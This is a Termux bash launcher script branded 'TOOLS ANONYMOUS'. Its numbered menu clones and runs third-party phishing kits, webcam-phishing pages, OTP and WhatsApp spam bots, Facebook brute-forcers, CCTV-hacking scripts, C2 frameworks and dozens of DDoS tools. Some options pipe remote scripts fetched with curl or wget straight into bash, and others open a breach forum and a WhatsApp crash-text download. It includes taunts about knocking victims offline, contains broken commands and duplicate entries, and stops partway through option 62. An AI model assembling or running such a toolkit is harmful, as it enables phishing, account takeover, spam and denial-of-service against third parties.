 #!/data/data/com.termux/files/usr/bin/bash
#hozoo
clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'


progreSh() {
    LR='\033[1;31m'
    LG='\033[1;32m'
    LY='\033[1;33m'
    LC='\033[1;36m'
    LW='\033[1;37m'
    NC='\033[0m'
    if [ "${1}" = "0" ]; then TME=$(date +"%s"); fi
    SEC=`printf "%04d\n" $(($(date +"%s")-${TME}))`; SEC="$SEC sec"
    PRC=`printf "%.0f" ${1}`
    SHW=`printf "%3d\n" ${PRC}`
    LNE=`printf "%.0f" $((${PRC}/2))`
    LRR=`printf "%.0f" $((${PRC}/2-12))`; if [ ${LRR} -le 0 ]; then LRR=0; fi;
    LYY=`printf "%.0f" $((${PRC}/2-24))`; if [ ${LYY} -le 0 ]; then LYY=0; fi;
    LCC=`printf "%.0f" $((${PRC}/2-36))`; if [ ${LCC} -le 0 ]; then LCC=0; fi;
    LGG=`printf "%.0f" $((${PRC}/2-48))`; if [ ${LGG} -le 0 ]; then LGG=0; fi;
    LRR_=""
    LYY_=""
    LCC_=""
    LGG_=""
    for ((i=1;i<=13;i++))
    do
    	DOTS=""; for ((ii=${i};ii<13;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LRR_="${LRR_}#"; else LRR_="${LRR_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${DOTS}${LY}${LC}${LG} ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 1 ]; then sleep .05; fi
    done
    for ((i=14;i<=25;i++))
    do
    	DOTS=""; for ((ii=${i};ii<25;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LYY_="${LYY_}#"; else LYY_="${LYY_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${DOTS}${LC}....${LG}.. ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 14 ]; then sleep .05; fi
    done
    for ((i=26;i<=37;i++))
    do
    	DOTS=""; for ((ii=${i};ii<37;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LCC_="${LCC_}#"; else LCC_="${LCC_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${LC}${LCC_}${DOTS}${LG}. ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 26 ]; then sleep .05; fi
    done
    for ((i=38;i<=49;i++))
    do
    	DOTS=""; for ((ii=${i};ii<49;ii++)); do DOTS="${DOTS}."; done
    	if [ ${i} -le ${LNE} ]; then LGG_="${LGG_}#"; else LGG_="${LGG_}."; fi
    	echo -ne "  ${LW}${SEC}  ${LR}${LRR_}${LY}${LYY_}${LC}${LCC_}${LG}${LGG_}${DOTS} ${SHW}%${NC}\r"
    	if [ ${LNE} -ge 38 ]; then sleep .01; fi
    done
}

printf ""
progreSh 0
progreSh 10
progreSh 20
progreSh 30
progreSh 40
progreSh 50
progreSh 60
progreSh 70
progreSh 80
progreSh 90
progreSh 100
printf ""

echo -e $red"

                     ██████████████████████
               ██████████████████████████████████
           ██████████████              ██████████████
        ██████████                            ██████████
     █████████                                    █████████
   ████████                  ██████                  ████████
  ██████             ██████████████████████             ██████
   ███           ██████████████████████████████           ███
              ██████████                ██████████
           ████████                         █████████
          ██████                               ███████
           ███            ████████████            ███
                      ████████████████████
                   ███████████    ███████████
                  ███████              ███████
                   ███                    ███

                            ████████
                           ██████████
                           ██████████
                            ████████
                            
"

echo -e $blue "
_______________________________________________
|             TOOLS ANONYMOUS                 |
|                 [2024]                      |
|_____________________________________________|
|1  |.DDOS WIFI JARINGAN MU KE PUTUS          |
|2  |.HACK PISZHER  01                        |
|3  |.HACK PIZHER   02                        |
|4  |.HACK PISZHER  03                        |
|5  |.HACK PIZHER   04                        |
|6  |.HACK PIZHER   05                        |
|7  |.HACK PISZHER  06                        |
|8  |.HACK PISZHER  07                        |
|9  |.HACK PISZHER  08                        |
|10 |.HACK PISZHER  09                        |
|11 |.HACK CAMERA PISZHER  01                 |
|12 |.HACK CAMERA PISHZHER 02                 |
|13 |.HACK CAMERA PISZHER  03                 |
|14 |.HACK CAMERA PISZHER  04                 |
|15 |.HACK CAMERA PISZHER  05                 |
|16 |.HACK CAMERA PISZHER  06                 |
|17 |.HACK CAMERA PISZHER  07                 |
|18 |.SPAM OTP WA 01                          | 
|19 |.SPAM OTP WA 02                          | 
|20 |.SPAM OTP WA 03                          |
|22 |.SPAM OTP WA 04                          |
|21 |.SPAM OTP WA 05                          |
|22 |.IP TRACK OSINT                          |
|23 |.CEK KARTU NOMOR OSINT                   |
|24 |.BANNER TERMUX FRESI BIASA               |
|25 |.BANNER JARVIS SERVER LUAR               |
|26 |.INSTALL NETHUNTER GUI  20GB             |
|27 |.INSTALL PKG DAN MODULE                  |
|28 |.TRACULLER OSINT WESIBE                  |
|29 |.GET CONTACT OSINT WEEIBE                |
|30 |.BRECHEAD FROM  VPN                      |
|31 |.PANDORA BY MRSANZZ ANONYMOUS            |
|32 |.OWL TOOLS OSINT BY IC                   |
|33 |.DDOS ANONYMOUS ATTACKER VIIP            |
|34 |.DDOS OVERLOAD ANONYMOUS                 |
|35 |.VIRTEX LAG DOWNLOAD MEDIAFIRE 278MB     |
|36 |.BUKA YOUTUBE   UNTUK NONTON VIDIO       |
|37 |.BUKA TIKTOK  UNTUK NONTON JJ VIDIO      |
|38 |.BUKA  CROME  UNTUK MELIAHAT PENCARIAN   |
|39 |.GPTCHAT  WESIBE UNTUK CHAT GPTCHAT WEB  |
|40 |.GPTCHAT  WESIBE UNTUK CHAT GPTCHAT WEB  |
|41 |.INSTAL.KALI NETHUNTER GUI RENDAH MINIMAL|
|42 |.HACK CCTV          SERVERS ONLINE       |
|43 |.HACK CCTV          SERVERS ONLINE       |
|44 |.BOT WHATSAPP VIPP ANONYMOUS     01      |
|45 |.BOT WHATSAPP VIIP ANONYOMOUS    02      |
|46 |.FreeGPT WebUI                           |
|47 |.OSGPT                                   |
|48 |.PDF-ChatGpt                             |
|49 |.voice-chatgpt-python                    |
|50 |.DDoS-Ripper                     01      |
|51 |.TOOLS DDOS HACKINGTOLSKIT       02      |
|52 |.DDOS ATTACK SERVER  DWON        03      |
|52 |.DDOS ATTACK  SERVER DWON        04      |
|53 |.DDOS ATTACK  SERVER DWON        05      |
|54 |.DDOS ATTACK FOR DISTRO LINUX    06      |
|55 |.DDOS ATTACK TOOOLS              07      |
|56 |.DDOS LAYER 7  DWON              08      |
|57 |.DDOS PhantomCrawler DWON        09      |
|58 |.DDOS KYLEBOT BOT DISCORD        10      |
|59 |.DDOS ATTACK SERVER DWON         11      |
|60 |.DDOS ATTACK SERVER DWON         12      |
|61 |.DDOS ATTACK SERVER DWON         13      |
|62 |.DDOS ATTACK SERVER DWON         14      |
|63 |.DDOS ATTACK SERVER DWON         15      |
|64 |.DDOS ATTACK SERVER DWON         16      |
|65 |.DDOS ATTACK SERVER DWON         17      |
|66 |.DDOS ATTACK SERVER DWON         18      |
|67 |.DDOS ATTACK SERVER DWON         19      |
|68 |.DDOS ATTACK SERVER DWON         20      |
|69 |.DDOS ATTACK SERVER DWON         21      |
|70 |.DDOS ATTACK SERVER DWON         22      |
|71 |.DDOS ATTACK SERVER DWON         23      |
|72 |.DDOS ATTACK SERVER DWON         24      |
|73 |.DDOS ATTACK SERVER DWON         25      |
|74 |.DDOS ATTACK SERVER DWON         26      |
|75 |.DDOS ATTACK SERVER DWON         27      |
|76 |.DDOS ATTACK SERVER DWON         28      |
|77 |.FACEBOOK-BRUTEFORCE             01      |
|78 |.FACEBOOK-BRUTEFORCE             02      |
|79 |.FACEBOOK-BRUTEFORCE             03      |
|80 |.FACEBOOK-BRUTEFORCE             04      |
|81 |.FACEBOOK-BRUTEFORCE             05      |
|82 |.FACEBOOK-BRUTEFORCE             06      |
|83 |.TUTORIAL INSTALL DEBIAN 13 WAHASA       |
|84 |.SNAPTIK UNTUK DOWNLOAD WATERMAK TIKTOK  |
|85 |.DOWNLOAD APK BVNC PLAY STORE            |
|86 |.T-mux-Banner                     01     |
|87 |.𝙏𝙀𝙍𝙈𝙐𝙓𝘽𝘼𝙉𝙉𝙀𝙍         02     |
|88 |.BANNER Termux Kit: CustoMUX      03     |
|89 |.BANNER BTHack tools              04     |
|90 |.USERFINDER OSINT USERNAME               |
|91 |.BruteForce (GH05T-INSTA)                |
|92 |.Rewind - A termux backup/restore tool   |
|93 |.TOOLSS WEB HUNTER JUMBLAH TOOLS  13     |
|94 |.INSTALL KALI NetHunter (Español)        |
|95 |.UTER BLOG/TERMUX METASXPLOIT            |
|96 |.HACK SHORTUrl                           |
|97 |.HACK GMAIL                              |
|98 |.HACK WIFI                           01  |
|99 |.HACK WIFI                           02  |
|100|.HACK WIFI TOOLS Airattackit         03  |
|___|_________________________________________|
|UPDATE SC ANONYOMOUS |   [UPDATE]            |
|LAPOR BUG ANONYMOUS  |    [LAPOR]            |
|SUPPORT ANONYMOUS    |   [SUPPROT]           |
|DONASI ANONYMOUS     |   [+628999859595]     |
|_____________________________________________|

"

read -p "                            ANONYMOUS-->" HOZOO;
#Spam OTP
if [ $HOZOO = 01 ] || [ $HOZOO = 1 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/Galirus404/DDOS404
cd DDOS404
chmod 777 ddos.sh
bash ddos.sh

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 02 ] || [ $HOZOO = 2 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone --depth=1 https://github.com/htr-tech/zphisher.git 
cd zphisher
bash zphisher.sh
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 03 ] || [ $HOZOO = 3 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update ; apt install git -y ; git clone git://github.com/htr-tech/nexphisher.git ; cd nexphisher ; bash setup ; bash nexphisher

  clear
    echo -e $green"Done Installed..."
fi

if [ $HOZOO = 04 ] || [ $HOZOO = 4 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt-get update -y
apt-get install php -y
apt-get install openssh -y 
apt-get install wget -y
apt-get install git -y
git clone https://github.com/Black-Hell-Team/LordPhish.git
cd LordPhish
bash setup.sh 
bash lord.sh

  clear
    echo -e $green"Done Installed..."
fi

if [ $HOZOO = 05 ] || [ $HOZOO = 5 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update ; apt install git curl php openssh-server -y ; git clone git://github.com/Optane002/ZPhisher.git ; cd ZPhisher ; bash ZPhisher.sh
  clear
    echo -e $green"Done Installed..."
fi

if [ $HOZOO = 06 ] || [ $HOZOO = 6 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/XPH4N70M/XPHISHER.git
cd XPHISHER 
bash xphisher.sh
  clear
    echo -e $green"Done Installed..."
fi

if [ $HOZOO = 07 ] || [ $HOZOO = 7 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update
apt install git -y
git clone https://github.com/asu765/A-phish
cd A-phisher
bash setup
bash A-phish
  clear
    echo -e $green"Done Installed..."
fi


if [ $HOZOO = 08 ] || [ $HOZOO = 8 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update && apt upgrade -y && apt install git wget php unzip curl -y && git clone https://github.com/AbirHasan2005/ShellPhish && cd ShellPhish && chmod +x * && bash shellphish.sh

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 09 ] || [ $HOZOO = 9 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update
apt upgrade
pkg install python
pkg install python2
pkg install git
git clone https://github.com/xploitstech/Xteam
ls
cd Xteam
pip3 install -r requirements.txt
chmod +x *
bash setup.sh
bash Xteam.sh

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 10 ] || [ $HOZOO = 10 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update
apt install git -y
git clone https://github.com/asu765/A-phish
cd A-phisher
bash setup
bash A-phish

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 11 ] || [ $HOZOO = 11 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    $ apt update && apt upgrade
 apt install git php wget curl jq
 git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 cd CAM-DUMPER
 chmod +x camdumper.sh
 ./camdumper.sh
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 12 ] || [ $HOZOO = 12 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
     termux-setup-storage
 apt update && apt upgrade -y
 apt install php
 apt install wget -y
 apt install curl -y
 git clone https://github.com/XPH4N70M/HACK-CAMERA.git 
 cd HACK-CAMERA
 chmod +x hack_camera.sh 
 bash setup
 bash hack_camera.sh 
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 13 ] || [ $HOZOO = 13 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 apt-get -y install php openssh git wget 
 git clone https://github.com/baradatipu/CamPhish
cd CamPhish
bash camphish.sh
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 14 ] || [ $HOZOO = 14 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 apt-get -y install php openssh git wget 
 git clone https://github.com/baradatipu/CamPhish
cd CamPhish
bash camphish.sh
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 15 ] || [ $HOZOO = 15 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 apt-get -y install php openssh git wget 
 git clone https://github.com/baradatipu/CamPhish
cd CamPhish
bash camphish.sh

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 16 ] || [ $HOZOO = 16 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 apt-get -y install php openssh git wget 
 git clone https://github.com/baradatipu/CamPhish
cd CamPhish
bash camphish.sh
    
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 17 ] || [ $HOZOO = 17 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/jasut1n/WebCamPhishing
cd WebCamPhishing
chmod +x webcamphish.sh
 ./webcamphish.sh
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 18 ] || [ $HOZOO = 18 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
pkg install git
pkg install python
pkg install python2
pkg install python3
git clone https://github.com/Hozo999/KANDURA-WARNING
cd KANDURA-WARNING
chmod 777 kandura-warning.py
python kandura-warning.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 19 ] || [ $HOZOO = 19 ]
    then
apt update -y && apt upgrade -y
apt install git -y
apt install python -y
git clone https://github.com/FatihArridho/brutal.git
cd brutal
pip install -r install.txt
python brutal.py    
 fi
if [ $HOZOO = 20 ] || [ $HOZOO = 20 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/rickyfazaa/MySPAMBot-OTP 
cd MySPAMBot-OTP 
python main.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 21 ] || [ $HOZOO = 21 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
pkg update && pkg upgrade
pkg install nano
pkg install git
pkg install python
git clone https://github.com/AmmarrBN/Tools-WhatsApp
bash install.sh
cd Tools-WhatsApp
python main.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 22 ] || [ $HOZOO = 22 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update ; apt install git curl -y ; git clone git://github.com/htr-tech/track-ip.git ; cd track-ip ; bash trackip
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 23 ] || [ $HOZOO = 23 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
     git clone https://github.com/IccTeam/Owl-sint
     cd Owl-sint
     chmod 777 Owl-sint
python2 owlsint.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 24 ] || [ $HOZOO = 24 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
pkg upgrade
pkg update
apt update
apt upgrade
 apt install python2 -y
apt install git -y
git clone https://github.com/h20-studio/T4MPILAN-V5
cd T4MPILAN-V5
 python2 style5.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 25 ] || [ $HOZOO = 25 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    apt-get update -y
apt-get upgrade -y
pkg install git -y
git clone https://github.com/ExpertAnonymous/T-LOAD
cd T-LOAD
chmod 777 T-LOAD
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 26 ] || [ $HOZOO = 26 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
 termux-setup-storage
pkg install wget
 wget -O install-nethunter-termux https://offs.ec/2MceZWr
 chmod +x install-nethunter-termux
./install-nethunter-termux

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 27 ] || [ $HOZOO = 27 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
termux-change-repo
termux-setup-storage
pkg update
pkg upgrade
pkg autoclean
pkg install curl
pkg install git
pkg install wget
pkg install zip
pkg install unzip
pkg Install python2
pkg install python
pkg install nodejs
# LTS Version
pkg install nodejs-lts
pkg install jq
pkg install libxml2-utils
pkg install grep
pkg install bc
pkg install htop
pkg install figlet
pkg install httping
pkg install dnsutils
pkg install openssh
pkg install ffmpeg   
pkg install termux-create-package
pkg install proot-distro
pkg install clang
pkg install libffi
pkg install openssl
pkg install screenfetch
pkg install w3m
pkg install cowsay
pkg install perl
pkg install ruby
pkg install rust
pkg install Cloudflared
pkg install sqlite
pkg install fakeroot
pkg install sshpass
pkg install golang
pkg install proot
pkg install tigervnc xorg-xhost
pkg install x11-repo
pkg update
pkg install root-repo
pkg update -y
pkg upgrade -y
pkg install php -y
pkg install openssh -y
pkg install git -y
git install github -y
pkg install figlet -y
pkg install python -y
pkg install python2 -y
pkg install python3 -y
pkg install perl -y
pkg install ruby -y
pkg install wget -y
pkg install nano -y
pkg install curl -y
pkg install x11-repo
pkg install tigervnc
apt install php -y
apt install python -y
apt install python2 -y
apt install python3 -y
apt install nano -y
apt install toilet -y
apt install figlet -y
apt install wget -y
apt install wcalc -y 
apt install nmap -y
apt install curl -y
apt install bmon -y
apt install apache2 -y
apt install ruby -y
apt install tor -y
apt install openssl -y
apt install macchanger -y
apt install install perl -y
apt install unzip -y
apt install python3 python3-pip
apt install curl && \
export install_path="/usr/local/bin" && \
mkdir -p "$install_path" && \
 curl -L 'https://github.com/termux/termux-create-package/releases/latest/download/termux-create-package' -o "$install_path/termux-create-package" && \
 chmod 755 "$install_path/termux-create-package";
export install_path="/usr/local/bin"
mkdir -p "$install_path"
pip install ruamel.yaml
pip3 install ruamel.yaml.
pip install --upgrade pip setuptools
pip install --upgrade httpie
pip install -U requests[socks]
pip install requests
apt list 
apt update 
apt upgrade 
apt install python 
apt install python2 
apt install wget 
apt install git 
apt install php 
apt install nano 
apt install unzip 
pip install requests
pip install mechanize p
pip install lolcat 
pip install termcolor 
apt install root-repo 
apt install unstable-repo 
apt install x11-repo 
apt update && pkg upgrade 
apt  install figlet 
apt install ruby 
gem install lolcat 
pkg install jq
pip install bs4
pkg install imagemagick
pkg install nodejs
pkg install ffmpeg
pip install rich
pip install requests
pip install bs4
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 28 ] || [ $HOZOO = 28 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://www.truecaller.com/id-id"

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 29 ] || [ $HOZOO = 29 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://getcontact.com/id/"
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 30 ] || [ $HOZOO = 30 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://breachforums.is"
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 31 ] || [ $HOZOO = 31 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
apt update && apt upgrade && pkg update && pkg upgrade
   pkg install curl
   pkg install wget
   pkg install python3
     pkg install git
     pkg install figlet
     git clone https://github.com/MrSanZz/pandora
     cd pandora
     pip3 install -r requirements.txt
     python3 pandora.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 32 ] || [ $HOZOO = 32 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/IccTeam/Owl-sint
     cd Owl-sint
     chmod 777 Owl-sint
python2 owlsint.py
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 33 ] || [ $HOZOO = 33 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/U7P4L-IN/U-DDOS/
cd U-DDOS/
npm i requests
npm i https-proxy-agent
npm i crypto-random-string
npm i events
npm i fs
npm i net
npm i cloudscraper
npm i request
npm i hcaptcha-solver
npm i randomstring
npm i cluster
npm i cloudflare-bypasser
pip3 install -r requirements.txt
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
apt-get install ./google-chrome-stable_current_amd64.deb
ulimit
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 34 ] || [ $HOZOO = 34 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1

  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 35 ] || [ $HOZOO = 35 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://www.mediafire.com/file/2gfa9gekyhcihgj/Virtex_WA_Slayer.txt/file"
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 36 ] || [ $HOZOO = 36 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://youtube.com/@SYTEMUMBRELLADRAK999?si=Jzao6XuQVrL4zutd"
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 37 ] || [ $HOZOO = 37 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://www.tiktok.com/@cyber_hozoo_nethunter999?_t=8loQQgCSVhB&_r=1"
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 38 ] || [ $HOZOO = 38 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://www.google.com/"
  clear
    echo -e $green"Done Installed..."
fi 
if [ $HOZOO = 39 ] || [ $HOZOO = 39 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open "https://chat.openai.com/"
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 40 ] || [ $HOZOO = 40 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
xdg-open ""https://chat.openai.com/
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 41 ] || [ $HOZOO = 41 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
pkg install root-repo && pkg install x11-repo && apt update && apt upgrade -y && apt update && apt install wget -y && apt update && wget https://raw.githubusercontent.com/shahinuralamin/Technical_Shahinur_Al-Amin/main/install-nethunter-modified 
chmod +x install-nethunter-modified
./install-nethunter-modified
  clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 42 ] || [ $HOZOO = 42 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    pkg update && pkg upgrade 
    git clone https://github.com/mohammadmahdi-termux/hackCCTV 
    cd hackCCTV 
    python3 hackcctv.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 43 ] || [ $HOZOO = 43 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    apt upgrade & update -y
apt install python3 git -y
git clone https://github.com/Raz-Ahamed/CCTV_Hack
pip install -r requirements.txt
cd CCTV_Hack
chmod +x *
python3 cctv.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 44 ] || [ $HOZOO = 44 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/aydinnyunus/WhatsappBOT.git 
cd WhatsappBOT 
python3 -m venv venv 
source venv/bin/activate
pip install -r requirements.txt
python WhatsappBot.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 45 ] || [ $HOZOO = 45 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/TheSpeedX/WhatScraper.git
cd WhatScraper
python3 -m pip install google
python3 whatscraper.py    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 46 ] || [ $HOZOO = 46 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/ramonvc/freegpt-webui.git 
    cd freegpt-webui 
    pip install -r requirements.txt 
    python run.py 
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 47 ] || [ $HOZOO = 47 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/Ravi-Teja-konda/OSGPT.git 
cd OSGPT
pip install -r requirements.txt
python3 main.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 48 ] || [ $HOZOO = 48 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/ayushwattal/PDF-ChatGpt.git 
cd ChatGpt.git
pip install -r requirements.txt
python app.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 49 ] || [ $HOZOO = 49 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/enoobis/voice-chatgpt-python
    cd chatgpt-python 
    pip install speech_recognition pyttsx3 openai 
    pip install portaudio 
    python voicechatgpt.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 50 ] || [ $HOZOO = 50 ]
    then
    clear
    echo -e $green" TUNGGU ANJING KONTOL LU"
    sleep 1
    pkg install git -y
pkg install python -y
pkg install python3 -y
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper 
 python3 DRipper.py
    echo -e $green"DDOS WIFI LU MATI DONGO"
fi
if [ $HOZOO = 51 ] || [ $HOZOO = 51 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
git clone https://github.com/CodingRanjith/hackingtoolkit.git
chmod +x hackingtoolkit
cd hackingtoolkit
python3 htk.py    
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 52 ] || [ $HOZOO = 52 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/karthik558/ddos-attack.git 
    cd ddos-attack 
    pip install -r requirements.txt
    python3 ddos.py
    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 53 ] || [ $HOZOO = 53 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    git clone https://github.com/mrprogrammer2938/DDos-Attack.git

cd DDos-attack

bash install.sh

python DDos.py

    clear
    echo -e $green"Done Installed..."
fi
if [ $HOZOO = 54 ] || [ $HOZOO = 54 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
curl -O https://raw.githubusercontent.com/Hex1629/INSTALL_MYPROJECT/main/INSTALL_SCRIPT/socketpie.linux && bash socketpie.linux    
    clear
    echo -e $green"Done Installed..."
    fi
    if [ $HOZOO = 55 ] || [ $HOZOO = 55 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
     pkg install git -y
    git clone https://github.com/biyivi/biyivi_ataque_DDos
 cd biyivi_ataque_DDos
bash install.sh
 python biyivi_ddos.py
    clear
    echo -e $green"Done Installed..."
fi
    if [ $HOZOO = 56 ] || [ $HOZOO = 56 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
  git clone https://github.com/Pari-Malam/Stresser7
cd Stresser7
pip/pip3 install -r requirements.txt
 python/python3 stresser.py  
    clear
    echo -e $green"Done Installed..."
fi
 if [ $HOZOO = 57 ] || [ $HOZOO = 57 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
  git clone https://github.com/spyboy-productions/PhantomCrawler.git 
  pip3 install -r requirements.txt 
  python3 PhantomCrawler.py
    clear
    echo -e $green"Done Installed..."
fi   
  if [ $HOZOO = 58 ] || [ $HOZOO = 58 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    apt-get install golang -y
apt-get install python3 -y
apt-get install python2 -y
apt-get install python3-pip -y
apt-get install nodejs -y
apt-get install npm -y
npm i requests
npm i https-proxy-agent
npm i crypto-random-string
npm i events
npm i fs
npm i net
npm i cloudscraper
npm i request
npm i hcaptcha-solver
npm i randomstring
npm i cluster
npm i cloudflare-bypasser 
git clone https://github.com/kyletran191/kylebot.git 
 cd kylebot
 python bot.py
    clear
    echo -e $green"Done Installed..."
fi
  if [ $HOZOO = 59 ] || [ $HOZOO = 59 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
   apt update -y && apt upgrade -y
$ pkg install git
$ pkg install python2
$ git clone https://github.com/WH1T3-E4GL3/eagle-dos.git
$ cd eagle-dos.py
$ git pull
$ python eagle-dos.py  
    clear
    echo -e $green"Done Installed..."
fi
  if [ $HOZOO = 60 ] || [ $HOZOO = 60 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    pkg update && pkg upgrade 
    pkg install curl 
    pkg install python3 
    pkg install git 
     cd C2 
     pip3 install -r requirements.txt
    python3 c2.py
    clear
    echo -e $green"Done Installed..."
fi
  if [ $HOZOO = 61 ] || [ $HOZOO = 61 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
    pkg update && pkg upgrade
pkg install git
pkg install python3
git clone https://github.com/MrSanZz/RevengeC2
cd RevengeC2
python3 c2.py
    clear
    echo -e $green"Done Installed..."
fi
  if [ $HOZOO = 62 ] || [ $HOZOO = 62 ]
    then
    clear
    echo -e $green" Installing..."
    sleep 1
